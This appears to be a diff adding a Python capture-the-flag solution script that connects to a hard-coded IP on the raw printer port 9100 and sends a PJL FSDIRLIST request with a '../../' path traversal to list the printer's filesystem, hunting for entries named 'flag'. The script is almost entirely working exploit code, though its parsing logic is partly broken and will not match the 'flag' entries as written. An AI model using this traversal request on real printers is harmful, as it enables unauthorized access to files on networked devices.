@@ -1,0 +1,63 @@
+#!/usr/bin/python3
+
+import socket
+import sys
+
+# print current directory path 
+def get_dir(soc, path, last_char):
+    r = ''
+    while True:
+        data = soc.recv(1)
+        if data == b'\n' and last_char == b'\n':
+            return r
+        r += str(data, 'utf-8')
+        last_char = data
+
+# check if it's a file or a directory
+def check_type(x):
+    if len(x) > 6 and x[5] == 'D':
+        return x[5:]
+    elif len(x) > 6 and x[5] == 'F':
+        return x[5:]
+
+def get_file_name(x):
+    name = ''
+    for i in x:
+        if i == ' ':
+            return name
+        else:
+            name += i
+
+def parse_response(x):
+    x = x.split()
+    for i in x:
+        t = check_type(i)
+        print(t)
+        if t == 'FILE':
+            check_flag(t)
+#         elif t == 'DIR':
+#             return get_file_name(i)
+
+def check_flag(x):
+    if x[0:4] == 'flag':
+        print('gotcha: ' + x)
+
+
+server_address = ('18.141.153.229', int('9100'))
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.settimeout(2)
+print('connecting to %s port %s' % server_address)
+sock.connect(server_address)
+
+init_dir_query = '@PJL FSDIRLIST NAME="0:/../../"\n'.encode('utf-8')
+# mut_dir_query = '@PJL FSDIRLIST NAME="0:/../../'
+
+sock.sendall(init_dir_query)
+
+# response = ''
+response = get_dir(sock, init_dir_query, b'')
+new_dir = parse_response(response)
+print(new_dir)
+
+sock.close()
